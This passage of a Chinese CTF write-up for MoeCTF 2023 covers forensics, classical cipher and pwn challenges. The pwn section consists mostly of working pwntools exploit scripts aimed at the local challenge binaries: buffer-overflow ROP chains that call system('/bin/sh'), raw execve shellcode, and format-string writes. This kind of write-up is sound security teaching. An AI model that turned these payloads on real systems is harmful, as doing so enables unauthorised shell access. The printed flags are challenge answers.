class="hljs-string">&#x27;noeviction&#x27;</span>, <span class="hljs-string">&#x27;allocator_frag_ratio&#x27;</span>: <span class="hljs-number">1.31</span>, <span class="hljs-string">&#x27;allocator_frag_bytes&#x27;</span>: <span class="hljs-number">260312</span>, <span class="hljs-string">&#x27;allocator_rss_ratio&#x27;</span>: <span class="hljs-number">3.14</span>, <span class="hljs-string">&#x27;allocator_rss_bytes&#x27;</span>: <span class="hljs-number">2363392</span>, <span class="hljs-string">&#x27;rss_overhead_ratio&#x27;</span>: <span class="hljs-number">1.11</span>, <span class="hljs-string">&#x27;rss_overhead_bytes&#x27;</span>: <span class="hljs-number">368640</span>, <span class="hljs-string">&#x27;mem_fragmentation_ratio&#x27;</span>: <span class="hljs-number">4.73</span>, <span class="hljs-string">&#x27;mem_fragmentation_bytes&#x27;</span>: <span class="hljs-number">3026008</span>, <span class="hljs-string">&#x27;mem_not_counted_for_evict&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_replication_backlog&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_normal&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_aof_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_allocator&#x27;</span>: <span class="hljs-string">&#x27;jemalloc-5.1.0&#x27;</span>, <span class="hljs-string">&#x27;active_defrag_running&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfree_pending_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfreed_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;loading&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size_age&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_fork_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;current_save_keys_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_save_keys_total&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_changes_since_last_save&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_bgsave_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_last_save_time&#x27;</span>: <span class="hljs-number">1697711149</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_current_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_enabled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_scheduled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_last_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_current_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_last_bgrewrite_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_write_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_connections_received&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;total_commands_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;instantaneous_ops_per_sec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_net_input_bytes&#x27;</span>: <span class="hljs-number">124</span>, <span class="hljs-string">&#x27;total_net_output_bytes&#x27;</span>: <span class="hljs-number">172</span>, <span class="hljs-string">&#x27;instantaneous_input_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;instantaneous_output_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;rejected_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_full&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_ok&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_err&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_stale_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;expired_time_cap_reached_count&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expire_cycle_cpu_milliseconds&#x27;</span>: <span class="hljs-number">176</span>, <span class="hljs-string">&#x27;evicted_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_channels&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_patterns&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;latest_fork_usec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_forks&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;migrate_cached_sockets&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;slave_expires_tracked_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_items&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_prefixes&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;unexpected_error_replies&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_error_replies&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;dump_payload_sanitizations&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_reads_processed&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;total_writes_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;io_threaded_reads_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;io_threaded_writes_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;master&#x27;</span>, <span class="hljs-string">&#x27;connected_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_failover_state&#x27;</span>: <span class="hljs-string">&#x27;no-failover&#x27;</span>, <span class="hljs-string">&#x27;master_replid&#x27;</span>: <span class="hljs-string">&#x27;72bf10998fb01f8851a13c92aaf4ccbbed81ab83&#x27;</span>, <span class="hljs-string">&#x27;master_replid2&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_repl_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;second_repl_offset&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;repl_backlog_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_size&#x27;</span>: <span class="hljs-number">1048576</span>, <span class="hljs-string">&#x27;repl_backlog_first_byte_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_histlen&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_cpu_sys&#x27;</span>: <span class="hljs-number">6.963199</span>, <span class="hljs-string">&#x27;used_cpu_user&#x27;</span>: <span class="hljs-number">8.13399</span>, <span class="hljs-string">&#x27;used_cpu_sys_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_user_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_sys_main_thread&#x27;</span>: <span class="hljs-number">6.965816</span>, <span class="hljs-string">&#x27;used_cpu_user_main_thread&#x27;</span>: <span class="hljs-number">8.12967</span>, <span class="hljs-string">&#x27;errorstat_ERR&#x27;</span>: <span class="hljs-string">&#x27;count=2&#x27;</span>, <span class="hljs-string">&#x27;cluster_enabled&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/guo15890025019/article/details/116994677">https://blog.csdn.net/guo15890025019/article/details/116994677</a><br>未完待续……….（咕咕咕</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>vm挂载vmdk，windows10系统<br>打开后回收站里有key，用key打开锁上的磁盘即可</p><h3 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h3><p><img src="/mdimg/moectf2023/45.png"><br><img src="/mdimg/moectf2023/46.png"></p><h3 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h3><p><img src="/mdimg/moectf2023/47.png"><br><img src="/mdimg/moectf2023/48.png"><br>挂载vc<br><code>&quot;L:\data\20230707221115-ibr7vs7\20230707221136-xyfn5al\20230707221147-1rzo2wp\20230707221158-6te2bxl.sy&quot;</code><br><img src="/mdimg/moectf2023/49.png"><br>base32<code>moectf&#123;S0_d33ply_H1dden!&#125; </code></p><h1 id="classical-Crypto"><a href="#classical-Crypto" class="headerlink" title="classical Crypto"></a>classical Crypto</h1><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h3><p>维吉尼亚，根据flag格式，用key <code>moectf&#123;</code>解维吉尼亚得到开头为<code>goodjo</code>猜测key为<code>goodjob</code>解密即可</p><h3 id="猫言喵语"><a href="#猫言喵语" class="headerlink" title="猫言喵语"></a>猫言喵语</h3><p><code>喵喵？</code>–》<code>-</code> <code>喵喵喵</code>–》<code>.</code><br><img src="/mdimg/moectf2023/50.png"></p><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>rot47</p><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p><img src="/mdimg/moectf2023/51.png"></p><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>凯撒7</p><h1 id="Ai"><a href="#Ai" class="headerlink" title="Ai"></a>Ai</h1><h3 id="EZ-MLP"><a href="#EZ-MLP" class="headerlink" title="EZ MLP"></a>EZ MLP</h3><p><img src="/mdimg/moectf2023/52.png"><br>调换即可<br><code>moectf&#123;fR13NdsHlP_15_M491C!&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h3 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>str_binsh_addr = <span class="hljs-number">0x804C02C</span><br>sys_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">50227</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;What\&#x27;s your age?&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;200&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Now..try to overflow!&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x58</span> + <span class="hljs-number">0x4</span>) + p32(sys_plt) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(str_binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>X = pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">50677</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   tmp = X.recvline()<br>   <span class="hljs-built_in">print</span>(tmp.decode())<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The first:&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      x=tmp.decode().index(<span class="hljs-string">&#x27;t&#x27;</span>)<br>      res1=tmp.decode()[x+<span class="hljs-number">2</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The second:&#x27;</span><span class="hljs-keyword">in</span> tmp:<br>      res2=tmp.decode()[<span class="hljs-number">11</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;=&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      val=tmp.decode()[<span class="hljs-built_in">len</span>(res1)+<span class="hljs-built_in">len</span>(res2):]<br>      <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(res1.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))+<span class="hljs-built_in">int</span>(res2)==<span class="hljs-built_in">int</span>(val)):<br>        data1=<span class="hljs-string">&quot;BlackBird&quot;</span>.encode()<br>        X.sendline(data1)<br>      <span class="hljs-keyword">else</span>:<br>        data2=<span class="hljs-string">&quot;WingS&quot;</span>.encode()<br>        X.sendline(data2)<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!You finish&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      X.interactive()<br>      tmp = X.recvline()<br>      <span class="hljs-built_in">print</span>(tmp.decode())<br></code></pre></td></tr></table></figure><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整形溢出<br><img src="/mdimg/moectf2023/a.png"><br>int 的取值范围 <code>-2147483648～2147483647</code><br>-114514=<code>2147483647</code>+1+2147483648-114514<br>v1=4294852782</p><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p><img src="/mdimg/moectf2023/b.png"><br>fd2=4*1|0x29A=670</p><h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>re = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">00000</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>binsh = <span class="hljs-number">0x404050</span><br>system_plt = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>system_plt2 = <span class="hljs-number">0x4012B7</span><br>rdi_ret = <span class="hljs-number">0x4011be</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">88</span> + p64(rdi_ret) + p64(binsh) + p64(system_plt2)<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(<span class="hljs-string">&#x27;120&#x27;</span>.encode())<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(payload)<br>re.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h3><p><img src="/mdimg/moectf2023/c.png"><br>网上找到shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34897</span>)<br>shellcode=<span class="hljs-string">&#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/d.png"></p><h3 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42085</span>)<br>#p = process(<span class="hljs-string">&#x27;./uninitialized_key&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;114514&quot;</span>)<br>gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;\x00&quot;</span>)#或者就直接留空。p.sendline(<span class="hljs-string">&quot;&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">17</span>):<br>    p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">32809</span>)<br>    <span class="hljs-comment"># p = process(&#x27;./format_level0&#x27;)</span><br><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    p.sendline(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;i&#125;</span>$p&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br><br>    byte_str = binascii.unhexlify(p.recvline()[:-<span class="hljs-number">1</span>])<br>    str_result = byte_str.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag+=str_result[::-<span class="hljs-number">1</span>]<br><br>    p.close()<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h3 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br><span class="hljs-built_in">context</span>.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">45993</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>leak = int(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><span class="hljs-keyword">base_add </span>= leak - <span class="hljs-number">0x1245</span><br>system_add = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x10A0</span><br><span class="hljs-keyword">bash </span>= <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x4010</span><br>pop_rdi = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x0000000000001323</span><br>ret = <span class="hljs-keyword">base_add </span>+ <span class="hljs-number">0x128D</span><br>success(hex(<span class="hljs-keyword">base_add))</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment"># gdb.attach(p)</span><br>paylaod = <span class="hljs-keyword">b&#x27;a&#x27; </span>* <span class="hljs-number">0x58</span> + p64(pop_rdi) + p64(<span class="hljs-keyword">bash) </span>+ p64(ret) + p64(system_add)<br>p.sendline(paylaod)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br># p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">54369</span>)<br>p = process(<span class="hljs-string">&#x27;./shellcode_level1&#x27;</span>)<br># gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>payload = asm(shellcraft.sh())<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Uninitialized-key-plus"><a href="#Uninitialized-key-plus" class="headerlink" title="Uninitialized_key_plus"></a><strong>Uninitialized_key_plus</strong></h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">33067</span>)<br># p = process(<span class="hljs-string">&#x27;./uninitialized_key_plus&#x27;</span>)<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">20</span> + p32(<span class="hljs-number">0x1BF52</span>)<br>p.sendline(payload)<br>p.sendline(b<span class="hljs-string">&quot;\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="format-level1"><a href="#format-level1" class="headerlink" title="format_level1"></a>format_level1</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">33853</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level1&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%8$n&quot;</span> + p64(<span class="hljs-number">0x804c00c</span>)<br>p.sendline(payload)<br># gdb.attach(p)<br>p.sendline(b<span class="hljs-string">&quot;1&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="rePWNse"><a href="#rePWNse" class="headerlink" title="rePWNse"></a>rePWNse</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">35899</span>)<br># p = process(<span class="hljs-string">&#x27;./rePWNse&#x27;</span>)<br><br><br>pop_rdi = <span class="hljs-number">0x000000000040168e</span><br><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">7</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">8</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span 